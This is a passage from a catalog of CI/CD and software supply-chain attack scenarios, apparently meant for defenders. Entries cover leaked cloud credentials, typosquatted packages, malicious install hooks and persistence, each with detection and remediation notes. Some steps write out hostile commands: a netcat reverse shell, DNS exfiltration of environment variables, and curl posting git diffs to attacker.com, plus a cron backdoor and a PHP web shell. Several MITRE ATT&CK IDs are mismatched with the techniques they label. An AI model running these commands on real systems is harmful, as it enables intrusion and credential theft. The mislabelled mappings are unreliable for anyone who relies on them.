- **Attack Steps**: 1. A GitHub Actions workflow assumes an AWS IAM role via OpenID Connect (OIDC). 2. The trust policy only restricts the OIDC provider and sub claim but lacks conditions like IP restrictions or repo validation. 3. Attacker creates a GitHub repo with the same name, creates a token, and replays the flow. 4. AWS allows the token to exchange into full credentials. 5. The attacker lists S3 buckets, creates IAM users, and modifies Route53 DNS records. 6. Logging is turned off to evade alerts and multiple Lambda functions are spawned for access renewal.
- **Detection**: CloudTrail STS AssumeRoleWithWebIdentity
- **Solution**: Add StringEquals and SourceArn in trust policy
- **Tags**: #aws #oidc #rolemisconfig

## Kubernetes Service Account in CI Has Cluster-Admin Role

- **Attack Type**: Overpowered Kubernetes SA
- **Target**: Kubernetes
- **Vulnerability**: Overpowered RBAC binding
- **MITRE**: T1557.003
- **Impact**: Cluster-wide compromise via sidecar
- **Tools**: kubectl, Kubernetes RBAC
- **Scenario**: A CI/CD pipeline uses a Kubernetes service account with cluster-admin, letting attacker gain full access via CI job injection.
- **Attack Steps**: 1. A deployment pipeline uses kubectl apply to deploy manifests into the cluster. 2. The token used is tied to a service account that has cluster-admin access. 3. The CI job does not sanitize pull requests and allows custom YAML to be submitted. 4. Attacker submits a PR adding a sidecar container in a deployment manifest that loads a malicious shell. 5. The CI job applies the YAML, granting the attacker a persistent shell in the cluster. 6. The attacker then uses kubectl exec to probe and pivot laterally.
- **Detection**: Kubernetes API Server logs
- **Solution**: Use namespace-scoped RBAC, never bind cluster-admin to CI
- **Tags**: #kubernetes #ci #rbacattack

## Jenkins Pipeline Accesses AWS Without Session Limits

- **Attack Type**: MFA-less AWS Access in CI
- **Target**: AWS
- **Vulnerability**: Unrestricted access key usage
- **MITRE**: T1552.001
- **Impact**: Long-term cloud credential abuse
- **Tools**: Jenkins, AWS CLI
- **Scenario**: Jenkins jobs use IAM credentials that lack MFA, role duration, or session restrictions, enabling attackers to extract and use them externally.
- **Attack Steps**: 1. Jenkins job includes AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY in global environment vars. 2. The IAM user attached has no time restriction, no SessionPolicy, and full EC2/S3 access. 3. Attacker gets shell access to Jenkins via SSRF or plugin exploit. 4. They extract credentials from /env or /scriptText and store them externally. 5. Using these keys, they connect to AWS CLI, create IAM backdoor users, and deploy EC2 with reverse SSH. 6. Since there’s no MFA or alerts, their presence goes unnoticed for days.
- **Detection**: IAM key usage logs, billing alerts
- **Solution**: Use short-term roles + session policies
- **Tags**: #jenkins #aws #iamsecurity

## Azure App Registration Used by CI Has Full Directory Access

- **Attack Type**: Azure AD App Abuse
- **Target**: Azure AD
- **Vulnerability**: Overprivileged app permissions
- **MITRE**: T1098
- **Impact**: Tenant-wide identity abuse
- **Tools**: Microsoft Graph, Azure Portal
- **Scenario**: Azure App registration used for CI/CD has Directory.ReadWrite.All permissions, allowing attackers to manipulate identities.
- **Attack Steps**: 1. Azure CI/CD app registration created to automate deployments. 2. The app has overly broad Graph API permissions, including Directory.ReadWrite.All. 3. Attacker compromises the app's client secret stored in the repo. 4. Using Graph API, attacker enumerates Azure AD users, groups, and resets passwords. 5. They register new apps with same permissions to retain access and escalate privileges.
- **Detection**: Graph API logs, app registration alerts
- **Solution**: Limit Graph API access to minimal required scopes
- **Tags**: #azuread #ciapp #identitytheft

## GitHub Token Binds to GCP Owner Role via Workload Identity

- **Attack Type**: Workload Identity Misuse
- **Target**: GCP
- **Vulnerability**: Unsafe identity pool binding
- **MITRE**: T1078.004
- **Impact**: Full GCP project compromise
- **Tools**: GitHub Actions, GCP IAM
- **Scenario**: GitHub repo bound to GCP workload identity permits token to assume GCP Owner role, letting attackers deploy malicious cloud infra.
- **Attack Steps**: 1. Workload Identity Federation is configured between GitHub and GCP using an identity pool. 2. Any job from the bound repo can use the token to impersonate a service account. 3. This account has Owner privileges on the GCP project. 4. Attacker submits PR that adds gcloud compute instances create with startup script that installs reverse shell. 5. The build runs, token is exchanged via gcloud auth workload-identity-federation, and attacker gets shell access. 6. Logging is disabled and bucket logs are wiped post-infiltration.
- **Detection**: Token exchange monitoring in IAM logs
- **Solution**: Use scoped service accounts + tight identity filters
- **Tags**: #github #gcp #workloadabuse

## Public Jenkins Artifact Exposes AWS Credentials

- **Attack Type**: Public Artifact Disclosure
- **Target**: Jenkins, AWS
- **Vulnerability**: Public artifact with sensitive credentials
- **MITRE**: T1552.001
- **Impact**: AWS infrastructure compromise via credential theft
- **Tools**: Jenkins, AWS CLI
- **Scenario**: A Jenkins pipeline inadvertently stores the config.json file containing AWS credentials in a public-facing job artifact repository.
- **Attack Steps**: 1. The Jenkins job is configured to run deployment scripts for AWS Lambda, requiring AWS access keys for authentication. 2. During the build process, the pipeline copies ~/.aws/config and ~/.aws/credentials files to a workspace directory for easier access by deployment scripts. 3. The final step in the pipeline zips the workspace as a build artifact and uploads it to the public Jenkins server. 4. No access control is applied to the artifact URL, which is listed in public build indexes. 5. An attacker scrapes Jenkins job indexes using a tool like dirsearch, identifies the public artifact, and downloads the ZIP. 6. They extract the AWS access key and secret key and verify access with aws sts get-caller-identity. 7. The credentials belong to a privileged user, allowing EC2 instance creation and access to sensitive S3 buckets. 8. Attacker installs persistence via hidden IAM users and scheduled Lambda invocations. 9. Audit trails are disabled and billing alert thresholds are raised to avoid detection. 10. The incident remains unnoticed for weeks until an unexpected surge in AWS usage occurs.
- **Detection**: Unusual billing, S3 access logs, Jenkins audit trails
- **Solution**: Avoid storing credentials in pipeline workspace, restrict public access to build artifacts
- **Tags**: #jenkins #aws #publicartifact

## GitHub Actions Workflow Artifacts Leak JWT Tokens

- **Attack Type**: Public Workflow Artifact Exposure
- **Target**: GitHub
- **Vulnerability**: Exposed test tokens in downloadable artifact
- **MITRE**: T1552.004
- **Impact**: Unauthorized API access via leaked JWT
- **Tools**: GitHub Actions, JWT, GitHub CLI
- **Scenario**: A GitHub Actions workflow stores JWT tokens in unencrypted artifact logs, which are accessible to any user with read access to the repository.
- **Attack Steps**: 1. A GitHub Actions pipeline handles OAuth-based login flows to third-party services and receives JWT tokens as part of a CI test. 2. These tokens are written to a .env.test file used by automated tests. 3. The file is included in a zipped artifact uploaded via actions/upload-artifact. 4. The repository is open-source, and all logged-in GitHub users can access the artifact download page. 5. An attacker clones the repository, checks the latest workflow run artifacts, and downloads the ZIP. 6. On inspection, they find the .env.test file with valid JWT tokens. 7. The attacker replays the token to gain unauthorized access to internal APIs meant for CI validation only. 8. They enumerate endpoints, dump internal metadata, and modify internal app settings via those endpoints. 9. As the artifact was never encrypted or time-limited, the access remains open until revoked. 10. The breach is discovered when API logs show access from unapproved IPs.
- **Detection**: GitHub audit logs, token replay detections
- **Solution**: Sanitize sensitive test files from CI artifacts, use short-lived tokens
- **Tags**: #github #jwt #ciartifact

## CircleCI Logs Reveal Database Connection Strings

- **Attack Type**: Sensitive Data in CI Logs
- **Target**: CircleCI
- **Vulnerability**: Leaked DB credentials in CI logs
- **MITRE**: T1087.002
- **Impact**: Full database breach and PII exposure
- **Tools**: CircleCI, MySQL CLI, dirsearch
- **Scenario**: A public CircleCI project stores plaintext database connection strings in job logs, allowing attackers to connect and dump database contents.
- **Attack Steps**: 1. A startup uses CircleCI for automatic testing and deployment of its Node.js application. 2. During the CI process, the application logs full DATABASE_URL strings for debugging purposes. 3. These logs are pushed to the CircleCI job output, which is retained for every public repository build. 4. An attacker enumerates CircleCI open job logs via web scraping and finds the logs containing lines like Connecting to DB: mysql://admin:password@db.internal.local:3306. 5. The credentials are valid for a production database exposed over a whitelisted IP. 6. Attacker runs mysql -h db.internal.local -u admin -p using leaked credentials. 7. They dump customer PII and order histories and export the data to an S3 bucket they control. 8. Later, they disable auditing by dropping the database user log triggers. 9. The attacker also injects a new stored procedure to backdoor future logins. 10. Breach goes undetected until abnormal data downloads are flagged.
- **Detection**: CircleCI log monitoring, database access logs
- **Solution**: Use redacted logging and rotate DB secrets frequently
- **Tags**: #circleci #database #ciartifacts

## TravisCI Artifact Contains SSH Private Key

- **Attack Type**: SSH Key Leak in Artifact
- **Target**: TravisCI
- **Vulnerability**: Leaked SSH key via public CI artifact
- **MITRE**: T1078
- **Impact**: Server takeover via artifact-based credential theft
- **Tools**: TravisCI, SSH, OpenSSH CLI
- **Scenario**: A TravisCI public repo stores SSH private keys in an artifact to enable deployments, but the artifact is downloadable by anyone.
- **Attack Steps**: 1. A team uses TravisCI to automate deployment to production servers via SSH. 2. Instead of using a deployment token, they store a private SSH key in the CI workspace, which is copied into the deployment script. 3. The key is accidentally archived into a build artifact ZIP file for "deployment logs" and pushed to public TravisCI artifact storage. 4. An attacker uses the Travis API to list recent artifacts for the repo. 5. On downloading the artifact, the attacker finds deploy_key.pem inside the ZIP. 6. They verify the private key's validity by trying ssh -i deploy_key.pem user@prod.example.com. 7. On success, they upload a persistent reverse shell into /etc/rc.local for continued access. 8. They add themselves to the sudo group and disable fail2ban to avoid lockout. 9. They also create a cron job that pings their server for availability every hour. 10. The breach is discovered much later when an unexpected login appears in SSH logs.
- **Detection**: TravisCI artifact audit, SSH log inspection
- **Solution**: Never store private keys in CI artifacts; use vault-integrated deployment tools
- **Tags**: #travisci #ssh #keyleak

## Public Build Logs Contain Valid GitHub PAT

- **Attack Type**: PAT in Logs
- **Target**: GitHub
- **Vulnerability**: PAT printed to CI logs
- **MITRE**: T1552.001
- **Impact**: Unauthorized GitHub repo access
- **Tools**: GitHub, GitHub PAT, grep
- **Scenario**: CI job outputs a GitHub Personal Access Token in build logs during debugging, available to anyone with access to logs.
- **Attack Steps**: 1. A CI job uses a GitHub PAT stored as an environment variable GITHUB_PAT to automate issue creation during deployments. 2. During troubleshooting, a developer adds echo $GITHUB_PAT to verify if the variable is set. 3. The CI log shows the full PAT in plaintext. 4. The repository is public and anyone with a GitHub account can access the CI logs under the "Actions" tab. 5. An attacker reads the logs and extracts the PAT. 6. They use it to authenticate to GitHub's API and enumerate private repos belonging to the same user/org. 7. Sensitive files and .env secrets are downloaded from private repos. 8. The attacker sets up a GitHub Action in a private repo to persist access and exfiltrate new files automatically. 9. When detected, the token has already been used to access multiple private endpoints and leak code. 10. The attack is finally caught when the victim sees unfamiliar commits in private repos.
- **Detection**: GitHub audit logs, token usage logs
- **Solution**: Use secrets masking, never echo secrets to logs
- **Tags**: #github #pat #logleak

## GitHub Releases Used to Store Debug Artifacts with API Keys

- **Attack Type**: Sensitive Files in GitHub Releases
- **Target**: GitHub
- **Vulnerability**: Sensitive files in public releases
- **MITRE**: T1213
- **Impact**: Financial fraud and data theft via leaked keys
- **Tools**: GitHub Releases, curl
- **Scenario**: Debugging builds uploaded as "releases" include .env files with valid API keys that remain accessible to the public.
- **Attack Steps**: 1. Developers zip build artifacts after CI test failures to upload for debugging. 2. They include .env, .aws, or .npmrc in the debug bundle without sanitization. 3. The bundle is uploaded via GitHub CLI to the project’s public release page. 4. An attacker monitors GitHub public releases using keyword filters (curl api.github.com/repos/*/releases). 5. They find a release containing a ZIP named debug_env_dump.zip. 6. On downloading and extracting it, they find active API keys for Stripe, Mailgun, and Firebase. 7. These keys are tested using Postman and give read/write access. 8. Attacker abuses the Stripe API to refund fake transactions to attacker-owned cards. 9. Firebase DB is dumped and erased, causing downtime. 10. The attack stops only when Stripe support flags unusual refund patterns.
- **Detection**: Stripe/Firebase access logs, GitHub download stats
- **Solution**: Don’t upload .env files to GitHub Releases
- **Tags**: #github #apikeyleak #releaseabuse

## S3 Bucket Contains CI Logs with Tokens

- **Attack Type**: Public Log Exposure
- **Target**: Jenkins, AWS
- **Vulnerability**: CI logs exposed via public bucket
- **MITRE**: T1119
- **Impact**: Staging compromise and lateral move
- **Tools**: AWS S3, Jenkins, AWS CLI
- **Scenario**: CI system configured to store logs in a public S3 bucket leads to exposure of sensitive access tokens.
- **Attack Steps**: 1. Jenkins pipeline is set to store console logs in an S3 bucket for archival. 2. The bucket is configured as public due to an earlier support requirement. 3. Logs include environment variable dumps during build failures. 4. An attacker scans AWS for public buckets and lists objects using aws s3 ls s3://ci-logs-company. 5. They find a jenkins-log-2024-02-10.txt file with embedded variables like GITHUB_TOKEN, DB_PASSWORD. 6. Credentials are valid and allow access to staging systems. 7. Attacker logs in to staging DB and deploys a malicious backend script. 8. They use the token to open PRs in the GitHub repo with malicious changes. 9. The staging system is turned into a reverse shell command-and-control channel. 10. Attack is only found during penetration testing weeks later.
- **Detection**: S3 access logs, GitHub commit reviews
- **Solution**: Store logs in private S3 buckets, never echo secrets
- **Tags**: #jenkins #s3 #logleak

## GitLab Pages Hosts CI Artifact with Config Secrets

- **Attack Type**: GitLab Pages Misuse
- **Target**: GitLab
- **Vulnerability**: Internal config leaked via GitLab Pages
- **MITRE**: T1213
- **Impact**: Abuse of internal APIs and phishing via leaked config
- **Tools**: GitLab, GitLab Pages
- **Scenario**: CI pipeline stores build output on GitLab Pages, accidentally exposing internal config files.
- **Attack Steps**: 1. A GitLab CI job publishes compiled frontend builds to GitLab Pages. 2. The source repo includes a config.prod.json file used during builds that holds service credentials. 3. The CI job copies the file into the final artifact and publishes it to a public GitLab Pages URL. 4. A researcher browsing GitLab Pages finds the exposed JSON file. 5. The JSON contains API keys for internal microservices and plaintext SMTP credentials. 6. Using the SMTP creds, the attacker sends phishing emails posing as internal devs. 7. The API keys are used to call admin-level service endpoints. 8. The attacker uploads malicious config changes via those endpoints. 9. Access logs are altered by overwriting the config file remotely. 10. Company realizes only after abnormal traffic to admin endpoints is flagged.
- **Detection**: GitLab Pages scans, email abuse reports
- **Solution**: Don’t expose backend configs in frontend builds
- **Tags**: #gitlab #pages #configleak

## TeamCity Public Artifacts Reveal Internal Deployment URLs

- **Attack Type**: Artifact Disclosure
- **Target**: TeamCity
- **Vulnerability**: Internal URLs in build artifacts
- **MITRE**: T1595
- **Impact**: Internal infra discovery and pivoting
- **Tools**: TeamCity, Shodan, curl
- **Scenario**: TeamCity builds upload deployment files containing staging/internal URLs, revealing infrastructure details to attackers.
- **Attack Steps**: 1. A public TeamCity server is used to build Docker images. 2. Artifacts include shell scripts with URLs to internal deployment endpoints. 3. A script like deploy.sh inside the artifact includes lines such as curl -X POST http://staging.internal/api/deploy. 4. Attacker downloads the artifact and maps internal infrastructure based on exposed URLs. 5. They launch DNS rebinding attacks to exploit access behind NATs. 6. Internal API endpoints are fuzzed and found to be vulnerable to command injection. 7. Attacker deploys modified code to staging via poisoned API call. 8. They observe the behavior and pivot to production once access patterns are confirmed. 9. The compromised build is later used in production due to shared pipeline. 10. The attacker remains persistent through hidden DNS records and cron job callbacks.
- **Detection**: Artifact analysis, internal DNS log monitoring
- **Solution**: Don’t include internal infra in build artifacts
- **Tags**: #teamcity #infraleak #cicd

## CircleCI Public Project Stores Secrets in YAML

- **Attack Type**: Hardcoded Secrets in YAML
- **Target**: CircleCI
- **Vulnerability**: Secrets hardcoded in CI config
- **MITRE**: T1552.001
- **Impact**: Cloud misuse, resource abuse, stealth persistence
- **Tools**: CircleCI, GitHub
- **Scenario**: CircleCI config file in a public repo includes plaintext secrets, accidentally committed by a developer.
- **Attack Steps**: 1. A public GitHub project uses CircleCI for testing and deployment. 2. The .circleci/config.yml file includes env block with hardcoded secrets like AWS_SECRET_KEY. 3. A contributor pushes a commit including a new job and adds the keys inline for simplicity. 4. GitHub’s webhooks trigger the build. 5. An attacker browsing trending CircleCI projects finds the YAML and copies the secrets. 6. They validate the credentials using AWS CLI. 7. On success, attacker lists S3 buckets, spins up EC2 instances for crypto mining. 8. CloudWatch alarms are disabled using API. 9. Billing shoots up but goes unnoticed until payment threshold is reached. 10. Post-incident analysis confirms the key was live for weeks.
- **Detection**: AWS billing alerts, GitHub file scan tools
- **Solution**: Use secret managers and never hardcode keys
- **Tags**: #circleci #yaml #secretleak

## Reverse Shell via Malicious npm Package

- **Attack Type**: Malicious Dependency Execution
- **Target**: CI Runners
- **Vulnerability**: Lack of validation on dependencies
- **MITRE**: T1059.003
- **Impact**: CI Runner compromise, supply chain backdoor
- **Tools**: npm, Netcat
- **Scenario**: Attacker uploads a malicious npm package that, when used in a build script, spawns a reverse shell back to a remote server.
- **Attack Steps**: 1. Attacker creates a new npm package named lodash-lite, mimicking the popular lodash package. 2. They add post-install scripts to run nc -e /bin/bash attacker.com 4444 on Linux machines. 3. A developer accidentally adds lodash-lite in their package.json thinking it's a lightweight variant. 4. During CI builds, the package is installed and the postinstall script runs, establishing a reverse shell to the attacker’s server. 5. Attacker gains a foothold inside the CI runner. 6. They explore the filesystem, extract environment variables, and steal AWS tokens. 7. Secrets are exfiltrated via encrypted HTTP POST requests. 8. The attacker installs persistent agents to survive reboots. 9. They tamper with build output files before the final build artifact is created. 10. The compromised software is shipped to production with subtle backdoors.
- **Detection**: EDR alerts, unexpected outbound connections
- **Solution**: Use --ignore-scripts, pin and audit dependencies
- **Tags**: #npm #reverse-shell #postinstall

## Python PyPI Dependency Leaks Secrets via DNS

- **Attack Type**: Data Exfiltration
- **Target**: Build Environment
- **Vulnerability**: Import-time side-effects
- **MITRE**: T1001.003
- **Impact**: Secret exfiltration, lateral movement
- **Tools**: PyPI, dig
- **Scenario**: A malicious PyPI package includes code to exfiltrate environment secrets over DNS queries during build.
- **Attack Steps**: 1. Attacker publishes a package named requests-sslfix on PyPI. 2. It includes an import-time execution of os.environ dumping, encoded into subdomains. 3. In the build, import requests_sslfix is triggered in a unit test. 4. The code executes: for k,v in os.environ.items(): os.system("nslookup "+k+"."+v+".attacker.com"). 5. Every environment variable (including tokens) is exfiltrated over DNS. 6. The attacker’s DNS server logs the incoming lookups. 7. They reconstruct credentials and cloud tokens. 8. Using those, they gain access to GitHub and AWS accounts. 9. They perform silent cloning and tampering with downstream repositories. 10. The compromise propagates internally over time via trusted integrations.
- **Detection**: Monitor DNS queries during builds
- **Solution**: Use private indexes, dependency pinning
- **Tags**: #pypi #dnsleak #envdump

## Ruby Gem Executes eval on Build

- **Attack Type**: Eval-Based RCE via Dependency
- **Target**: Ruby Builds
- **Vulnerability**: Unchecked eval execution
- **MITRE**: T1059.001
- **Impact**: Code execution on CI, data theft
- **Tools**: RubyGems
- **Scenario**: Attacker adds eval(File.read("payload.rb")) in gem’s Rakefile, executing malicious Ruby code during build.
- **Attack Steps**: 1. Attacker uploads a gem named activesupport-plus mimicking activesupport. 2. Inside Rakefile, they embed: eval(File.read("payload.rb")). 3. payload.rb contains code to open a reverse shell or run destructive commands. 4. A build script invokes rake to run tests as part of CI. 5. The Rakefile is executed automatically. 6. The eval runs and spawns remote code on the CI server. 7. Attacker enumerates directories, steals SSH keys and .env files. 8. They zip the sensitive data and exfiltrate via an FTP upload script. 9. Malware is left to monitor future builds silently. 10. It remains undetected until a post-mortem after an integrity check fails.
- **Detection**: File integrity checks on gems
- **Solution**: Avoid gems with side-effectful Rakefiles
- **Tags**: #rubygems #eval #rake

## JavaScript Dependency Exploits Preinstall to Modify PATH

- **Attack Type**: CI Hijack via PATH Poisoning
- **Target**: Linux CI
- **Vulnerability**: PATH injection via dependency
- **MITRE**: T1036.003
- **Impact**: Full CI hijack, altered builds
- **Tools**: npm, bash
- **Scenario**: A malicious dependency alters $PATH to override standard commands like git or curl with attacker binaries.
- **Attack Steps**: 1. Malicious package build-helper is installed with a preinstall script. 2. Script adds /tmp/.malicious/ to the front of $PATH. 3. Fake git and curl scripts are placed there to intercept developer commands. 4. git records credentials and repo URLs and uploads them to attacker’s server. 5. curl returns tampered files for remote requests, injecting malicious data. 6. Build steps relying on these tools unknowingly use compromised versions. 7. The attacker modifies code pulled from remote sources. 8. Final build is altered silently without build failures. 9. No anti-virus alerts are triggered as it’s all script-based. 10. Attacker continues intercepting until build server is re-imaged.
- **Detection**: Monitor environment variable diffs
- **Solution**: Use sandboxed environments for build tools
- **Tags**: #pathpoisoning #ci #buildhijack

## Composer PHP Dependency Drops Web Shell

- **Attack Type**: Web App Backdoor via Composer
- **Target**: Web App
- **Vulnerability**: Malicious post-install in Composer
- **MITRE**: T1505.003
- **Impact**: Web shell deployed in production
- **Tools**: Composer, PHP
- **Scenario**: A malicious PHP package adds a hidden PHP file in public/, giving the attacker remote access.
- **Attack Steps**: 1. Attacker uploads laravel-assist package to Packagist. 2. During install, a post-install script copies shell.php to the public/ directory. 3. This PHP file accepts commands via $_GET['cmd'] and runs system(). 4. A Laravel app builds with this dependency, unaware of the copied file. 5. When deployed, https://example.com/shell.php?cmd=ls gives attacker full command output. 6. They scan internal networks from within the web server. 7. They escalate via misconfigured sudo scripts. 8. After persistence, they deface the site and leak data. 9. Attacker cleans logs with a cron job in the same dependency. 10. The backdoor persists across deployments until file-level audit discovers it.
- **Detection**: Web file scanning, EDR agents
- **Solution**: Use allowlisted Composer packages
- **Tags**: #composer #php #webshell

## Go Dependency Tampering with Build Flags

- **Attack Type**: Build-Time Behavior Alteration
- **Target**: Go Build
- **Vulnerability**: Malicious flag parser in dependency
- **MITRE**: T1546
- **Impact**: Silent data exfiltration via compiled binary
- **Tools**: Go, go build
- **Scenario**: A Go package parses custom build flags to activate malicious logic at compile-time.
- **Attack Steps**: 1. A package named fastlog-go is added as a logging utility. 2. The attacker modifies init() function to look for -X fastlog.secret=true. 3. If set, the package modifies logging behavior to redirect all logs to attacker.com. 4. During build, a custom flag is passed unintentionally from another module. 5. This triggers malicious logic in the compiled binary. 6. Logs from auth modules, DB queries, and payment info are sent to attacker’s server. 7. The app compiles and functions normally, masking the behavior. 8. No post-build static scans detect the change. 9. Logs accumulate for weeks before anomaly is spotted. 10. Forensics show that the flag behavior was silently exploited.
- **Detection**: Monitor outbound traffic patterns
- **Solution**: Avoid indirect flag overrides, audit deps
- **Tags**: #go #buildflag #logleak

## Maven Dependency Includes Jar with Built-In Keylogger

- **Attack Type**: Keylogging via Java Package
- **Target**: Java CI
- **Vulnerability**: Obfuscated keylogger inside jar
- **MITRE**: T1056
- **Impact**: CI secrets theft, internal access
- **Tools**: Maven, Java
- **Scenario**: A rogue Maven package bundles a Logger.class that records keystrokes in CI terminals and dev builds.
- **Attack Steps**: 1. Attacker uploads commons-tools jar to Maven Central. 2. The jar contains a hidden Logger.class that listens for key input. 3. Devs run mvn install during builds, adding the package. 4. When test cases run with CLI prompts, keystrokes are captured. 5. The logger stores input in a temp file and emails it via built-in SMTP. 6. Jenkins jobs using interactive stages (e.g., API key prompts) are exposed. 7. Attacker receives plaintext tokens, admin passwords, and credentials. 8. They pivot into internal Jenkins using captured passwords. 9. Malware persists inside JAR and resists decompilation via obfuscation. 10. Detected during JAR diff review against original OSS source.
- **Detection**: Class diffing, SMTP monitoring
- **Solution**: Avoid unverified jars from public repos
- **Tags**: #maven #keylogger #jarattack

## Dependency Adds Crontab Entry on CI

- **Attack Type**: Scheduled Persistence
- **Target**: CI Servers
- **Vulnerability**: Persistence via cron in CI
- **MITRE**: T1053.003
- **Impact**: Scheduled backdoor reinjection
- **Tools**: Bash, crontab
- **Scenario**: Post-install script in a dependency writes a cronjob to re-open access every hour.
- **Attack Steps**: 1. ci-helper-tools is installed from a public Git repo. 2. Post-install, it runs echo '@hourly bash /tmp/.door.sh' >> /etc/crontab. 3. /tmp/.door.sh contains logic to re-download reverse shell binaries. 4. Even if the CI runner is wiped, the cron ensures reinfection. 5. On ephemeral runners, this is less effective but works on persistent ones. 6. The cronjob is hidden with name apache-runner. 7. Attacker leverages this to run recon and exfil scripts. 8. They rotate backdoors every 24 hours to avoid signature matches. 9. The server joins a botnet of compromised CI runners. 10. Discovery happens during unexpected HTTP POST logs every hour.
- **Detection**: Cron listing, temp file watch
- **Solution**: Avoid dependencies with elevated install scripts
- **Tags**: #cron #ci #persistencetool

## Rust Crate Executes Base64-Decoded Payload

- **Attack Type**: Encoded Payload Execution
- **Target**: Rust CI
- **Vulnerability**: Base64 decoding abuse in build
- **MITRE**: T1140
- **Impact**: SSH tunnel backdoor via crate
- **Tools**: Cargo, Rust
- **Scenario**: Malicious Rust crate decodes a base64-encoded shell script and runs it silently.
- **Attack Steps**: 1. A fake crate serde-fast is uploaded to crates.io. 2. It includes let cmd = base64::decode(…) pointing to a remote shell payload. 3. During build, the decoded script is written to /tmp/s.sh and executed. 4. The script sets up SSH tunnels to attacker infra. 5. The app compiles and functions, but CI is now exposed to reverse tunnels. 6. Shell history and .cargo/credentials are stolen. 7. Attacker gets lateral movement via shared runners. 8. The script uninstalls itself but leaves a watcher script behind. 9. Silent persistence continues for days. 10. Detection occurs after firewall logs detect outbound SSH on port 2222.
- **Detection**: Firewall monitoring, crate audits
- **Solution**: Avoid new crates without trust history
- **Tags**: #rust #cargo #base64

## Package Dependency Runs Git Hook Installer

- **Attack Type**: Git Hook Backdoor
- **Target**: Git
- **Vulnerability**: Git hook abuse via dep install
- **MITRE**: T1205.003
- **Impact**: IP theft, code monitoring
- **Tools**: Git, Bash
- **Scenario**: A malicious package adds a .git/hooks/post-commit script to CI clone, exfiltrating code diffs.
- **Attack Steps**: 1. Attacker publishes a package that silently modifies .git/hooks/post-commit. 2. It adds curl -X POST -d "$(git diff HEAD~1)" attacker.com to the hook. 3. During each commit, code diffs are sent externally. 4. Developers push to repo, triggering the hook on every commit. 5. Even CI clones run the hook during commits in build scripts. 6. Attacker monitors each change in source code in real time. 7. They gain early access to unreleased features and secrets. 8. Attacker sells the data to competitors or uses it for extortion. 9. Detected when git hook mismatch is found in audit. 10. Forensics reveal long-term source code leakage.
- **Detection**: Git hook auditing, hook diffing
- **Solution**: Reset hooks, disallow hook injection
- **Tags**: #githook #ci #supplychain

## npm Dependency with Data Exfiltration in Build Script

- **Attack Type**: Malicious Dependency in Build Phase
- **Target**: CI/CD Pipelines
- **Vulnerability**: Build script manipulation
- **MITRE**: T1557
- **Impact**: Cloud credentials stolen
- **Tools**: npm, Node.js
- **Scenario**: An attacker publishes an npm package with a build script that reads .env variables and exfiltrates them to a remote server.
- **Attack Steps**: 1. Attacker publishes a package named build-utils-fast on npm. 2. Inside the package.json, they define a prepare script that runs during install. 3. This script uses Node’s fs and http modules to read .env file contents and send them via HTTP POST to an attacker-controlled endpoint. 4. A developer unknowingly adds this dependency for CI optimizations. 5. During the CI pipeline execution, the build phase triggers the prepare script. 6. Environment secrets like AWS keys, database passwords, and auth tokens are read silently. 7. These values are encoded into JSON and exfiltrated to the attacker’s server. 8. The CI completes successfully without any error or warning. 9. Meanwhile, the attacker gains full access to cloud infrastructure. 10. This persists across builds until the rogue package is detected and removed.
- **Detection**: Monitor outbound HTTP during build
- **Solution**: Use .npmrc to disable scripts; verify dependencies
- **Tags**: #npm #envleak #buildscripts

## Malicious PyPI Package Modifies Build Output

- **Attack Type**: Build Artifact Poisoning
- **Target**: Python Packaging
- **Vulnerability**: Tampering post-build
- **MITRE**: T1554
- **Impact**: Runtime RCE from altered builds
- **Tools**: PyPI, Python setup.py
- **Scenario**: A fake Python package modifies the contents of generated .whl files during packaging, injecting a payload.
- **Attack Steps**: 1. Attacker creates a package requests-helper-pro and uploads it to PyPI. 2. Inside the setup.py, a post-processing hook modifies wheel content after packaging. 3. It adds a line in __init__.py that fetches and executes code from a remote server. 4. A developer uses this package in a Flask app, and CI builds the wheel before deployment. 5. The altered build artifact includes the injected code. 6. Once deployed, every time the app runs, it pulls code from attacker’s endpoint and executes it dynamically. 7. This gives the attacker persistent code execution in production. 8. Logs are cleared silently using Python’s logging module override. 9. Months later, the team notices strange outbound traffic patterns. 10. Investigation reveals tampered build artifacts from CI system.
- **Detection**: Static diff of wheel files
- **Solution**: Avoid dynamic code loading; pin known-good versions
- **Tags**: #pypi #python #wheelattack

## Typo-Squatted Go Dependency Used in Shared CI Template

- **Attack Type**: Typo-Based Supply Chain Attack
- **Target**: Go Build Pipelines
- **Vulnerability**: Typo-squatting + auto-exec
- **MITRE**: T1555
- **Impact**: Credential + system metadata theft
- **Tools**: Go Modules
- **Scenario**: A malicious Go module named golang.org/x/crypt0 mimics a real one and is imported accidentally in a reusable CI pipeline.
- **Attack Steps**: 1. Attacker registers golang.org/x/crypt0 and adds it to a public Go proxy. 2. The module includes an init() function that runs on import and collects hostname, env variables, and working directory. 3. A shared CI pipeline used across teams includes this import. 4. As each repo runs the pipeline, the malicious init function runs automatically. 5. System metadata and secrets are uploaded to a GitHub Gist via the API. 6. The attacker regularly polls the Gist to extract new info. 7. Over weeks, this provides internal architecture and token access. 8. Some Go binaries are published with this module included. 9. Reverse engineering later reveals the origin of the leak. 10. Forensic audit finds typo-squatted module to be the source.
- **Detection**: Monitor imported module behavior
- **Solution**: Use private Go proxies with strict dependency lists
- **Tags**: #go #typosquat #ciattack

## Malicious Build Dependency Overwrites SSH Config

- **Attack Type**: Developer Backdoor Setup
- **Target**: GitHub CI
- **Vulnerability**: SSH manipulation
- **MITRE**: T1552.004
- **Impact**: Repo hijack, code tampering
- **Tools**: Shell scripts, GitHub Actions
- **Scenario**: An attacker embeds logic in a build dependency to add a new SSH entry in .ssh/config, redirecting access to attacker server.
- **Attack Steps**: 1. Malicious dependency dev-ssh-tools includes an install script. 2. During CI build setup, the script checks for presence of .ssh/config. 3. If found, it appends a new Host block pointing github.com to a malicious IP. 4. The SSH private key remains unchanged but the destination is intercepted. 5. Any CI jobs pushing to GitHub or pulling from private repos now talk to attacker’s proxy. 6. Attacker captures git operations and steals code or credentials. 7. Later stages of the pipeline run with poisoned sources. 8. Build results include attacker-modified files. 9. Detection occurs when git hashes don’t match expected ones. 10. Security team finds tampering in the SSH config and traces it to the install script.
- **Detection**: Check .ssh/config diffs
- **Solution**: Harden CI runners, inspect postinstall scripts
- **Tags**: #ssh #buildattack #cihijack

## Malicious Dependency Logs All Build Variables

- **Attack Type**: Build Context Exposure
- **Target**: CI/CD Secrets
- **Vulnerability**: Secrets exposure via logger
- **MITRE**: T1557.002
- **Impact**: Build secrets exposed to attacker
- **Tools**: Bash, Curl
